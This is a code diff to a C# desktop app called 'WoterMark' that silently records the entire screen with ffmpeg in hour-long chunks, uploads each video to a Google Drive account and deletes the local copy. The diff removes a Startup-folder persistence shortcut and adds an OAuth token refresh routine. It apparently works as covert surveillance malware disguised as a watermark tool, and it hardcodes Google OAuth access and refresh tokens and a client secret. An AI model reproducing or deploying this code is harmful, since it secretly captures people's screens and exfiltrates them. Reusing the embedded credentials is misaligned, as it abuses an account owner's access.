@@ -29,28 +29,25 @@ using Google.Apis.Util.Store;
 using static Google.Apis.Drive.v3.DriveService;
 using Google.Apis.Upload;
 using static System.Formats.Asn1.AsnWriter;
+using System.Net.Http;
+using System.Net.Http.Json;
+using System.Text.Json.Serialization;
+using Newtonsoft.Json;
 
 namespace WoterMark
 {
     public partial class MainWindow : Window
     {
-        private const string _AccessToken = "ya29.a0AXooCguR03Y1aa9ZB2i11jqzQXTmmCDDvIWjq9GK_o7NWeglxZv-qRpYZPowoxiOIZBIR_ZZMPXcZL9NPwEyi7GTRx2tF-QacqSu-KBJlnhCP6P82LkhRnIwr-JPECfMYgwcX4XlUOwrB0OKEQLahQTXQSvTBtIcQzIeaCgYKAVcSARMSFQHGX2MikAZujxR-yJvv7lyH5s6S_g0171";
-        private const string _RefreshToken = "1//04TYvodE0hcHGCgYIARAAGAQSNwF-L9Ir-_bpulQ4uBfztYdgjiSjQamvG39icW3C1Rzu658DtzFzsa88ZhqSaGQg-a24NSNwaVY";
-        private const string _ClientId = "137923084845-2s9kl5knqe8mpa2orfg78nt8qeph8j9s.apps.googleusercontent.com";
-        private const string _ClientSecret = "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";
-        private const string _ApplicationName = "service";
-        private const string _UserName = "shared.vid.acc@gmail.com";
+        private static string _AccessToken = "ya29.a0AXooCguR03Y1aa9ZB2i11jqzQXTmmCDDvIWjq9GK_o7NWeglxZv-qRpYZPowoxiOIZBIR_ZZMPXcZL9NPwEyi7GTRx2tF-QacqSu-KBJlnhCP6P82LkhRnIwr-JPECfMYgwcX4XlUOwrB0OKEQLahQTXQSvTBtIcQzIeaCgYKAVcSARMSFQHGX2MikAZujxR-yJvv7lyH5s6S_g0171";
+        private static string _RefreshToken = "1//04VhWthKnXY_gCgYIARAAGAQSNwF-L9Ir_JHVoqYzCWeeUThqf4xJ6O7wAxg2gn5GUjhhvXWEFOolMCUXiIWjQEwGZJa_LwaZaLc";
+        private static string _ClientId = "137923084845-2s9kl5knqe8mpa2orfg78nt8qeph8j9s.apps.googleusercontent.com";
+        private static string _ClientSecret = "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";
+        private static string _ApplicationName = "service";
+        private static string _UserName = "shared.vid.acc@gmail.com";
+        private static HttpClient _client => new HttpClient();
         public MainWindow()
         {
-            try
-            {
-                WindowsServices.Create($@"C:\users\{Environment.UserName}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WoterMark.lnk", System.IO.Path.Combine(Directory.GetCurrentDirectory(), "WoterMark.exe"));
-            }
-            finally
-            {
-                InitializeComponent();
-            }
-
+            InitializeComponent();
             Task.Run(() => RecordScreen());
         }
 
@@ -64,6 +61,7 @@ namespace WoterMark
             {
                 try
                 {
+                    await RefreshToken();
                     if (currentDate != DateTime.Now.ToString("yyyy-MM-dd"))
                     {
                         currentDate = DateTime.Now.ToString("yyyy-MM-dd");
@@ -71,9 +69,10 @@ namespace WoterMark
                     }
 
                     var dt = DateTime.Now.ToString("yyyy-MM-dd-HH-mm");
+                    System.IO.File.AppendAllText($"{libsPath}\\1.txt", $"Start recording at {dt}");
                     executor.Execute(true, $"cd {libsPath}", $"ffmpeg.exe -t 3600 -hide_banner -loglevel error -f gdigrab -framerate 15 -i desktop -c:v libx264 {dt}.mp4 -f {dt}.mp4");
 
-                    UploadFile($"{libsPath}/{dt}.mp4", new string[] {parentId});
+                    UploadFile($"{libsPath}/{dt}.mp4", new string[] { parentId });
                     System.IO.File.Delete($"{libsPath}/{dt}.mp4");
                     Thread.Sleep(10000);
                 }
@@ -83,6 +82,16 @@ namespace WoterMark
                     System.IO.File.AppendAllText($"{libsPath}\\1.txt", ex.Message);
                 }
             }
+        }
+
+        private async Task RefreshToken()
+        {
+            _client.DefaultRequestHeaders.Add("Host", "oauth2.googleapis.com");
+            _client.DefaultRequestHeaders.Add("user-agent", "google-oauth-playground");
+            var textContent = new StringContent(@"{""token_uri"":""https://oauth2.googleapis.com/token"",""client_id"":""137923084845-2s9kl5knqe8mpa2orfg78nt8qeph8j9s.apps.googleusercontent.com"",""client_secret"":""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"",""refresh_token"":""1//04VhWthKnXY_gCgYIARAAGAQSNwF-L9Ir_JHVoqYzCWeeUThqf4xJ6O7wAxg2gn5GUjhhvXWEFOolMCUXiIWjQEwGZJa_LwaZaLc""}");
+            var response = await _client.PostAsync("https://developers.google.com/oauthplayground/refreshAccessToken", textContent);
+            var content = await response.Content.ReadAsStringAsync();
+            _AccessToken = JsonConvert.DeserializeObject<Rootobject>(content).access_token;
         }
 
         protected override void OnSourceInitialized(EventArgs e)
